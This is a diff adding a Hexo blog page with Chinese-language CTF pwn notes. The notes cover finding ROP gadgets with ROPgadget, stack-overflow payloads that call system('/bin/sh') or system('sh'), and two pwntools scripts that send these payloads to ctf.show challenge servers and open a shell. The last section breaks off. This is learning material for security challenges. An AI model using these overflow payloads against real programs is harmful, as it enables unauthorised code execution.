@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Zbaoabo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="PWD[TOC] 1.rdi ret 地址的获取12ROPgadget --binary pwn(文件名) --only &quot;pop|ret&quot; | grep rdi  1payload &#x3D; b&#x27;a&#x27;*(0xA+8) + p64(pop_rdi) + p64(bin_sh)  + p64(ret) + p64(system)  –binary pwn: 指定了要">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Zbaoabo">
+<meta property="og:url" content="http://example.com/2025/04/18/pwn/index.html">
+<meta property="og:site_name" content="Zbaoabo">
+<meta property="og:description" content="PWD[TOC] 1.rdi ret 地址的获取12ROPgadget --binary pwn(文件名) --only &quot;pop|ret&quot; | grep rdi  1payload &#x3D; b&#x27;a&#x27;*(0xA+8) + p64(pop_rdi) + p64(bin_sh)  + p64(ret) + p64(system)  –binary pwn: 指定了要">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic3.zhimg.com/v2-0d5932332a96e3cc797fc7b3dea499a0_1440w.jpg">
+<meta property="article:published_time" content="2025-04-18T12:59:41.306Z">
+<meta property="article:modified_time" content="2025-04-25T13:54:48.420Z">
+<meta property="article:author" content="zhangsuhong">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic3.zhimg.com/v2-0d5932332a96e3cc797fc7b3dea499a0_1440w.jpg">
+  
+    <link rel="alternative" href="/atom.xml" title="Zbaoabo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/">zhangsuhong</a></h1>
+		</hgroup>
+
+		
+			<p class="header-subtitle"></p>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">Home</a></li>
+				        
+							<li><a href="/archives">Archives</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+						<!-- music -->
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">I&#39;m a developer.</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">Home</a></li>
+		        
+					<li><a href="/archives">Archives</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-pwn" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/04/18/pwn/" class="article-date">
+  	<time datetime="2025-04-18T12:59:41.306Z" itemprop="datePublished">2025-04-18</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="PWD"><a href="#PWD" class="headerlink" title="PWD"></a>PWD</h1><p>[TOC]</p>
+<h3 id="1-rdi-ret-地址的获取"><a href="#1-rdi-ret-地址的获取" class="headerlink" title="1.rdi ret 地址的获取"></a>1.rdi ret 地址的获取</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn(文件名) --only &quot;pop|ret&quot; | grep rdi</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*(0xA+8) + p64(pop_rdi) + p64(bin_sh)  + p64(ret) + p64(system)</span><br></pre></td></tr></table></figure>
+
+<p><strong>–binary pwn: 指定了要分析的二进制文件的文件名</strong><br><strong>–only “pop|ret”: 指定了只查找包含”pop”和”ret”指令序列的代码片段，这些指令通常用于弹出寄存器中的值，并将控制流返回到调用函数的地址处，是ROP攻击中常用的gadgets</strong> </p>
+<p><strong>| grep rdi: 将ROPgadget的输出传递给grep命令，然后使用grep命令筛选出包含”rdi”寄存器的代码片段，这样就可以只找到包含”pop|ret”指令序列并且弹出rdi寄存器的gadgets</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28286)</span><br><span class="line">payload = b&#x27;a&#x27;*(0xA+8) + p64(0x4007e3) + p64(0x400808) + p64(0x4004fe) + p64(0x400520)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><strong>在64位的Linux系统中，参数传递是通过寄存器来完成的，而 system 函数的第一个参数（即需要执行的命令字符串）是通过 rdi 寄存器传递的，所以，我们首先需要将 &#x2F;bin&#x2F;sh 字符串的地址放入 rdi 寄存器中，然后才能调用system函数，这就是为什么我们需要知道 pop rdi ;ret 指令序列的地址，因为它会将栈顶的值弹出到 rdi 寄存器中，而 ret 指令的作用是用于绕过栈中的返回地址，通过 ret 指令返回到调用者，从而间接地调用 system 函数。</strong> </p>
+<h3 id="2-sh"><a href="#2-sh" class="headerlink" title="2.sh"></a>2.sh</h3><p><strong>“sh” 指向依赖一个被 PATH 环境变量指定的 shell，而 “&#x2F;bin&#x2F;sh” 直接指向系统中一个默认的 shell 可执行文件。</strong></p>
+<p>这里我们可以将这个字符串（’sh’）的地址作为参数传递给 system 函数的第一个参数，通常是一个指向要执行的命令的字符串。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*(0x12+4) + p32(system) + p32(0) + p32(sh)</span><br></pre></td></tr></table></figure>
+
+<p><strong>(system的地址在ida中指的是_system的地址)</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28213)</span><br><span class="line">payload = b&#x27;a&#x27;*(0xA+8) + p64(0x400843) + p64(0x400872) + p64(0x40053e) + p64(0x400560)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-fd"><a href="#3-fd" class="headerlink" title="3.fd"></a>3.fd</h3><p><img src="https://pic3.zhimg.com/v2-0d5932332a96e3cc797fc7b3dea499a0_1440w.jpg" alt="img"></p>
+<p>首先读取最多14个字符到bss段的变量info中，然后读取最多0x4B到栈变量。</p>
+<p>并且继续寻找发现程序提供了system函数，显而易见，直接ret2shellcode。</p>
+<p>如果就这样结束了，这题一定被冲烂了。程序加了一个限制check函数：</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2025/04/19/%E4%BC%AA%E5%8A%A0%E5%AF%86/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2025/04/18/CRY/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title"></div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2025 zhangsuhong
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
